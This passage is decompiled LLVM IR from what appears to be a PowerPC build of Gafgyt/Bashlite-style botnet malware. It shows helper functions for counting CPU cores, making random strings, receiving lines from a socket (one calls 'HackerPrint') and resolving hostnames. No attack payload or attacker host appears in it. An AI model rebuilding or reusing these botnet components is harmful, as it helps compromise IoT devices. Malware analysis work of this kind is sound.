  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp9, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp9)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp9, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp9)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp9, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.8 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.8, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_1000193c ], [ %storemerge3, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c3 = load i8, i8* %arg1, align 1
  %v3_10001b246 = icmp eq i8 %v2_10001b1c3, 0
  br i1 %v3_10001b246, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge8 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in7 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge8, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in7)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge8, align 1
  %v1_10001b10 = add i32 %storemerge.in7, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in7, { 1, 0 }
  uselistorder i8* %storemerge8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @getBogos(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 268442480, i32* @lr, align 4
  %v3_10001b6c = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_100162f8.25 to i32), i32 0)
  %v2_10001d0c = ptrtoint i32* %stack_var_-4128 to i32
  %v1_10001b84 = bitcast i32* %stack_var_-4128 to i8*
  br label %dec_label_pc_10001d0c

dec_label_pc_10001b7c:                            ; preds = %dec_label_pc_10001d0c
  store i32 268442504, i32* @lr, align 4
  %v2_10001b84 = call i32 @uppercase(i8* %v1_10001b84)
  store i32 268442524, i32* @lr, align 4
  %v5_10001b98 = call i32 @strstr(i32 %v2_10001d0c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10016308.26, i32 0, i32 0), i32 268500992)
  %v4_10001ba8 = icmp eq i32 %v5_10001b98, %v2_10001d0c
  br i1 %v4_10001ba8, label %dec_label_pc_10001bb0, label %dec_label_pc_10001cf4

dec_label_pc_10001bb0:                            ; preds = %dec_label_pc_10001b7c
  %tmp15 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bc0:                            ; preds = %dec_label_pc_10001bf4, %dec_label_pc_10001be0, %dec_label_pc_10001bcc
  %v1_10001bc4 = add i32 %v4_10001bcc, 1
  %v5_10001bc8 = inttoptr i32 %v1_10001bc4 to i8*
  br label %dec_label_pc_10001bcc

dec_label_pc_10001bcc:                            ; preds = %dec_label_pc_10001bb0, %dec_label_pc_10001bc0
  %storemerge2 = phi i8* [ %v5_10001bc8, %dec_label_pc_10001bc0 ], [ %tmp15, %dec_label_pc_10001bb0 ]
  %v4_10001bcc = ptrtoint i8* %storemerge2 to i32
  %v2_10001bd0 = load i8, i8* %storemerge2, align 1
  %v3_10001bd8 = icmp eq i8 %v2_10001bd0, 32
  br i1 %v3_10001bd8, label %dec_label_pc_10001bc0, label %dec_label_pc_10001be0

dec_label_pc_10001be0:                            ; preds = %dec_label_pc_10001bcc
  %v2_10001be4 = load i8, i8* %storemerge2, align 1
  %v3_10001bec = icmp eq i8 %v2_10001be4, 9
  br i1 %v3_10001bec, label %dec_label_pc_10001bc0, label %dec_label_pc_10001bf4

dec_label_pc_10001bf4:                            ; preds = %dec_label_pc_10001be0
  %v2_10001bf8 = load i8, i8* %storemerge2, align 1
  %v3_10001c00 = icmp eq i8 %v2_10001bf8, 58
  br i1 %v3_10001c00, label %dec_label_pc_10001bc0, label %dec_label_pc_10001c34.preheader

dec_label_pc_10001c34.preheader:                  ; preds = %dec_label_pc_10001bf4
  %v2_10001c4c = add i32 %v4_10001bcc, -1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c0c:                            ; preds = %dec_label_pc_10001c64, %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c14 = call i32 @__GI_strlen()
  %v1_10001c28 = add i32 %v0_10001c14, %v2_10001c4c
  %v3_10001c30 = inttoptr i32 %v1_10001c28 to i8*
  store i8 0, i8* %v3_10001c30, align 1
  br label %dec_label_pc_10001c34

dec_label_pc_10001c34:                            ; preds = %dec_label_pc_10001c34.preheader, %dec_label_pc_10001c0c
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c3c = call i32 @__GI_strlen()
  %v1_10001c50 = add i32 %v0_10001c3c, %v2_10001c4c
  %v1_10001c54 = inttoptr i32 %v1_10001c50 to i8*
  %v2_10001c54 = load i8, i8* %v1_10001c54, align 1
  %v3_10001c5c = icmp eq i8 %v2_10001c54, 13
  br i1 %v3_10001c5c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c64

dec_label_pc_10001c64:                            ; preds = %dec_label_pc_10001c34
  store i32 %v4_10001bcc, i32* @r3, align 4
  %v0_10001c6c = call i32 @__GI_strlen()
  %v1_10001c80 = add i32 %v0_10001c6c, %v2_10001c4c
  %v1_10001c84 = inttoptr i32 %v1_10001c80 to i8*
  %v2_10001c84 = load i8, i8* %v1_10001c84, align 1
  %v3_10001c8c = icmp eq i8 %v2_10001c84, 10
  br i1 %v3_10001c8c, label %dec_label_pc_10001c0c, label %dec_label_pc_10001c94

dec_label_pc_10001c94:                            ; preds = %dec_label_pc_10001c64
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442788, i32* @lr, align 4
  %v2_10001ca0 = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001ca8 = icmp eq i32 %v2_10001ca0, 0
  br i1 %v3_10001ca8, label %dec_label_pc_10001ccc, label %dec_label_pc_10001cb0

dec_label_pc_10001cb0:                            ; preds = %dec_label_pc_10001c94
  store i32 %v4_10001bcc, i32* @r3, align 4
  store i32 268442816, i32* @lr, align 4
  %v2_10001cbc = call i32 @__GI_strchr(i32 %v4_10001bcc, i32 46)
  %v3_10001cc8 = inttoptr i32 %v2_10001cbc to i8*
  store i8 0, i8* %v3_10001cc8, align 1
  br label %dec_label_pc_10001ccc

dec_label_pc_10001ccc:                            ; preds = %dec_label_pc_10001c94, %dec_label_pc_10001cb0
  %v3_10001cdc = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  store i32 ptrtoint (i32* @global_var_10001ce8.27 to i32), i32* @lr, align 4
  %v1_10001ce4 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001cf4:                            ; preds = %dec_label_pc_10001b7c
  store i32 268442892, i32* @lr, align 4
  %v3_10001d08 = call i32 @__GI_memset(i32 %v2_10001d0c, i32 0, i32 4096)
  br label %dec_label_pc_10001d0c

dec_label_pc_10001d0c:                            ; preds = %entry, %dec_label_pc_10001cf4
  %v3_10001d1c = call i32 @fdgets(i32 %v2_10001d0c, i32 4096, i32 %v3_10001b6c)
  %v3_10001d24 = icmp eq i32 %v3_10001d1c, 0
  br i1 %v3_10001d24, label %dec_label_pc_10001d2c, label %dec_label_pc_10001b7c

dec_label_pc_10001d2c:                            ; preds = %dec_label_pc_10001d0c
  store i32 ptrtoint (i32* @global_var_10001d34.28 to i32), i32* @lr, align 4
  %v1_10001d30 = call i32 @__libc_close(i32 %v3_10001b6c)
  br label %dec_label_pc_10001d3c

dec_label_pc_10001d3c:                            ; preds = %dec_label_pc_10001ccc, %dec_label_pc_10001d2c
  %storemerge = phi i32 [ 1, %dec_label_pc_10001d2c ], [ 0, %dec_label_pc_10001ccc ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_10001bcc, { 1, 0, 3, 2, 4, 7, 5, 6, 8 }
  uselistorder i8* %storemerge2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_10001d0c, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10001b6c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001d3c, { 1, 0 }
  uselistorder label %dec_label_pc_10001d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10001ccc, { 1, 0 }
  uselistorder label %dec_label_pc_10001c34, { 1, 0 }
  uselistorder label %dec_label_pc_10001bcc, { 1, 0 }
}

define i32 @getCores() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  store i32 268443020, i32* @lr, align 4
  %v3_10001d88 = call i32 @__libc_open(i32 ptrtoint ([14 x i8]* @global_var_100162f8.25 to i32), i32 0)
  %v2_10001dec = ptrtoint i32* %stack_var_-4112 to i32
  %v1_10001da0 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_10001dec

dec_label_pc_10001d98:                            ; preds = %dec_label_pc_10001dec
  store i32 268443044, i32* @lr, align 4
  %v2_10001da0 = call i32 @uppercase(i8* %v1_10001da0)
  store i32 268443064, i32* @lr, align 4
  %v5_10001db4 = call i32 @strstr(i32 %v2_10001dec, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_10016308.26, i32 0, i32 0), i32 268500992)
  %v4_10001dc0 = icmp eq i32 %v5_10001db4, %v2_10001dec
  br i1 %v4_10001dc0, label %dec_label_pc_10001dc8, label %dec_label_pc_10001dd4

dec_label_pc_10001dc8:                            ; preds = %dec_label_pc_10001d98
  %v1_10001dcc = add i32 %stack_var_-4116.1, 1
  br label %dec_label_pc_10001dd4

dec_label_pc_10001dd4:                            ; preds = %dec_label_pc_10001d98, %dec_label_pc_10001dc8
  %stack_var_-4116.0 = phi i32 [ %v1_10001dcc, %dec_label_pc_10001dc8 ], [ %stack_var_-4116.1, %dec_label_pc_10001d98 ]
  store i32 268443116, i32* @lr, align 4
  %v3_10001de8 = call i32 @__GI_memset(i32 %v2_10001dec, i32 0, i32 4096)
  br label %dec_label_pc_10001dec

dec_label_pc_10001dec:                            ; preds = %entry, %dec_label_pc_10001dd4
  %stack_var_-4116.1 = phi i32 [ 0, %entry ], [ %stack_var_-4116.0, %dec_label_pc_10001dd4 ]
  %v3_10001dfc = call i32 @fdgets(i32 %v2_10001dec, i32 4096, i32 %v3_10001d88)
  %v3_10001e04 = icmp eq i32 %v3_10001dfc, 0
  br i1 %v3_10001e04, label %dec_label_pc_10001e0c, label %dec_label_pc_10001d98

dec_label_pc_10001e0c:                            ; preds = %dec_label_pc_10001dec
  store i32 268443156, i32* @lr, align 4
  %v1_10001e10 = call i32 @__libc_close(i32 %v3_10001d88)
  ret i32 %stack_var_-4116.1

; uselistorder directives
  uselistorder i32 %stack_var_-4116.1, { 0, 2, 1 }
  uselistorder i32 %v2_10001dec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10001dec, { 1, 0 }
  uselistorder label %dec_label_pc_10001dd4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001e4c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001ecc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001ecc4, label %dec_label_pc_10001e68, label %dec_label_pc_10001ed4

dec_label_pc_10001e68:                            ; preds = %entry, %dec_label_pc_10001e68
  %storemerge37 = phi i32 [ %v1_10001ebc, %dec_label_pc_10001e68 ], [ 0, %entry ]
  %v2_10001e74 = add i32 %storemerge37, %v0_10001e4c
  %v0_10001e78 = call i32 @rand_cmwc()
  store i32 %v0_10001e78, i32* %r3.global-to-local, align 4
  %v1_10001e8c = urem i32 %v0_10001e78, 26
  %fold = add nuw nsw i32 %v1_10001e8c, 65
  %v1_10001eb4 = trunc i32 %fold to i8
  %v3_10001eb4 = inttoptr i32 %v2_10001e74 to i8*
  store i8 %v1_10001eb4, i8* %v3_10001eb4, align 1
  %v1_10001ebc = add nuw nsw i32 %storemerge37, 1
  %v2_10001ecc = icmp slt i32 %v1_10001ebc, %arg2
  br i1 %v2_10001ecc, label %dec_label_pc_10001e68, label %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge

dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge: ; preds = %dec_label_pc_10001e68
  %v0_10001eec.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001ed4

dec_label_pc_10001ed4:                            ; preds = %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge, %entry
  %v0_10001eec = phi i32 [ %v0_10001eec.pre, %dec_label_pc_10001ec4.dec_label_pc_10001ed4_crit_edge ], [ %v0_10001e4c, %entry ]
  ret i32 %v0_10001eec

; uselistorder directives
  uselistorder i32 %v1_10001ebc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001e4c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001e68, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001f28.29 to i32), i32* @lr, align 4
  %v4_10001f24 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001f38 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001f4c

dec_label_pc_10001f4c:                            ; preds = %entry, %dec_label_pc_10001f4c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001f68, %dec_label_pc_10001f4c ]
  %v1_10001f54 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001f58 = add i32 %v1_10001f54, %v2_10001f38
  %v2_10001f60 = inttoptr i32 %v2_10001f58 to i32*
  store i32 0, i32* %v2_10001f60, align 4
  %v1_10001f68 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001f68, 32
  br i1 %tmp42, label %dec_label_pc_10001f4c, label %dec_label_pc_10001f7c

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f4c
  %v1_10001f80 = udiv i32 %arg1, 32
  %v1_10001f88 = mul nuw nsw i32 %v1_10001f80, 4
  %v2_10001f8c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001f90 = add nuw nsw i32 %v1_10001f88, 32
  %v1_10001f94 = add i32 %v2_10001f90, %v2_10001f8c
  %v1_10001f98 = inttoptr i32 %v1_10001f94 to i32*
  %v2_10001f98 = load i32, i32* %v1_10001f98, align 4
  %v1_10001fa0 = urem i32 %arg1, 32
  %v3_10001fa8 = shl i32 1, %v1_10001fa0
  %v2_10001fac = or i32 %v2_10001f98, %v3_10001fa8
  store i32 %v2_10001fac, i32* %v1_10001f98, align 4
  %v1_10001fc8 = add i32 %arg1, 1
  %v2_10001fd4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268443632, i32* @lr, align 4
  %v5_10001fec = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_10001ffc = icmp sgt i32 %v5_10001fec, 0
  br i1 %v2_10001ffc, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_1000210c.preheader

dec_label_pc_1000210c.preheader:                  ; preds = %dec_label_pc_10001f7c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_10002008:                            ; preds = %dec_label_pc_1000210c.preheader, %dec_label_pc_10002100
  %stack_var_-176.017 = phi i32 [ %v1_10002104, %dec_label_pc_10002100 ], [ %tmp25, %dec_label_pc_1000210c.preheader ]
  %v3_1000200c = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 ptrtoint (i32* @global_var_10002024.32 to i32), i32* @lr, align 4
  %v4_10002020 = call i32 @HackerPrint(i32 %v3_1000200c, i32 ptrtoint ([5 x i8]* @global_var_10016314.31 to i32), i32 268500992)
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001f38, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, %dec_label_pc_10002008
  %v3_1000204c.pre = phi i32 [ %v2_10001f38, %dec_label_pc_10002008 ], [ %v3_1000204c.pre.pre, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_1000206449 = phi i32 [ 1, %dec_label_pc_10002008 ], [ %v1_10002064, %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge ]
  %v1_10002050 = mul nuw nsw i32 %v1_1000206449, 4
  %v2_10002054 = add i32 %v1_10002050, %v3_1000204c.pre
  %v2_1000205c = inttoptr i32 %v2_10002054 to i32*
  store i32 0, i32* %v2_1000205c, align 4
  %v1_10002064 = add nuw nsw i32 %v1_1000206449, 1
  %tmp44 = icmp ult i32 %v1_10002064, 32
  br i1 %tmp44, label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge, label %dec_label_pc_10002078

dec_label_pc_10002048.dec_label_pc_10002048_crit_edge.dec_label_pc_10002048.dec_label_pc_10002048_crit_edge_crit_edge: ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v3_1000204c.pre.pre = load i32, i32* %stack_var_-200, align 4
  br label %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge

dec_label_pc_10002078:                            ; preds = %dec_label_pc_10002048.dec_label_pc_10002048_crit_edge
  %v2_10002094 = load i32, i32* %v1_10001f98, align 4
  %v2_100020a8 = or i32 %v2_10002094, %v3_10001fa8
  store i32 %v2_100020a8, i32* %v1_10001f98, align 4
  store i32 268443884, i32* @lr, align 4
  %v5_100020e8 = call i32 @__libc_select(i32 %v1_10001fc8, i32 %v2_10001f38, i32 0, i32 %v2_10001f38, i32 %v2_10001fd4)
  %v2_100020f8 = icmp sgt i32 %v5_100020e8, 0
  br i1 %v2_100020f8, label %dec_label_pc_100021a8.preheader, label %dec_label_pc_10002100

dec_label_pc_10002100:                            ; preds = %dec_label_pc_10002078
  %v1_10002104 = add nsw i32 %stack_var_-176.017, 1
  %tmp45 = icmp slt i32 %v1_10002104, 10
  br i1 %tmp45, label %dec_label_pc_10002008, label %dec_label_pc_100021a8.preheader

dec_label_pc_100021a8.preheader:                  ; preds = %dec_label_pc_10002100, %dec_label_pc_10002078, %dec_label_pc_1000210c.preheader, %dec_label_pc_10001f7c
  %v2_10002134 = ptrtoint i8* %stack_var_-32 to i32
  br label %dec_label_pc_100021a8

dec_label_pc_1000212c:                            ; preds = %dec_label_pc_100021a8
  %v3_10002130 = load i32, i32* @global_var_1002aba8.30, align 4
  store i32 268443980, i32* @lr, align 4
  %v4_10002148 = call i32 @__libc_recv(i32 %v3_10002130, i32 %v2_10002134, i32 1, i32 0)
  %v3_10002150 = icmp eq i32 %v4_10002148, 1
  br i1 %v3_10002150, label %dec_label_pc_10002170, label %dec_label_pc_10002158

dec_label_pc_10002158:                            ; preds = %dec_label_pc_1000212c
  store i8 0, i8* %stack_var_-180.0, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_10002170:                            ; preds = %dec_label_pc_1000212c
  %v3_10002170 = load i8, i8* %stack_var_-32, align 1
  %v4_10002178 = ptrtoint i8* %stack_var_-180.0 to i32
  store i8 %v3_10002170, i8* %stack_var_-180.0, align 1
  %v1_10002184 = add i32 %v4_10002178, 1
  %v5_10002188 = inttoptr i32 %v1_10002184 to i8*
  %v3_1000218c = load i8, i8* %stack_var_-32, align 1
  %v3_10002194 = icmp eq i8 %v3_1000218c, 10
  br i1 %v3_10002194, label %dec_label_pc_100021d0, label %dec_label_pc_1000219c

dec_label_pc_1000219c:                            ; preds = %dec_label_pc_10002170
  %v1_100021a0 = add i32 %stack_var_-184.0, 1
  br label %dec_label_pc_100021a8

dec_label_pc_100021a8:                            ; preds = %dec_label_pc_100021a8.preheader, %dec_label_pc_1000219c
  %stack_var_-180.0 = phi i8* [ %v5_10002188, %dec_label_pc_1000219c ], [ %arg2, %dec_label_pc_100021a8.preheader ]
  %stack_var_-184.0 = phi i32 [ %v1_100021a0, %dec_label_pc_1000219c ], [ 0, %dec_label_pc_100021a8.preheader ]
  %v0_100021b0 = call i32 @__asm_mfcr()
  %v1_100021b4 = call i32 @__asm_rlwinm(i32 %v0_100021b0, i32 30, i32 31, i32 31)
  %v1_100021b8 = urem i32 %v1_100021b4, 256
  %v3_100021c8 = icmp eq i32 %v1_100021b8, 0
  br i1 %v3_100021c8, label %dec_label_pc_100021d0, label %dec_label_pc_1000212c

dec_label_pc_100021d0:                            ; preds = %dec_label_pc_100021a8, %dec_label_pc_10002170
  %stack_var_-180.1 = phi i8* [ %stack_var_-180.0, %dec_label_pc_100021a8 ], [ %v5_10002188, %dec_label_pc_10002170 ]
  store i8 0, i8* %stack_var_-180.1, align 1
  br label %dec_label_pc_100021e4

dec_label_pc_100021e4:                            ; preds = %dec_label_pc_10002158, %dec_label_pc_100021d0
  %storemerge = phi i32 [ -1, %dec_label_pc_10002158 ], [ %stack_var_-184.0, %dec_label_pc_100021d0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-180.0, { 3, 0, 1, 2 }
  uselistorder i8* %v5_10002188, { 1, 0 }
  uselistorder i32 %v1_10002104, { 1, 0 }
  uselistorder i32 %v1_10002064, { 1, 0 }
  uselistorder i32 %v2_10001fd4, { 1, 0 }
  uselistorder i32* %v1_10001f98, { 1, 2, 0, 3 }
  uselistorder i32 %storemerge618, { 1, 0 }
  uselistorder i32 %v2_10001f38, { 5, 4, 0, 6, 3, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i8* %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100021e4, { 1, 0 }
  uselistorder label %dec_label_pc_100021a8, { 1, 0 }
  uselistorder label %dec_label_pc_10002008, { 1, 0 }
  uselistorder label %dec_label_pc_10001f4c, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 268444200, i32* @lr, align 4
  %v1_10002224 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v3_10002234 = icmp eq i32 %v1_10002224, 0
  br i1 %v3_10002234, label %dec_label_pc_1000223c, label %dec_label_pc_10002254

dec_label_pc_1000223c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10002248.34 to i32), i32* @lr, align 4
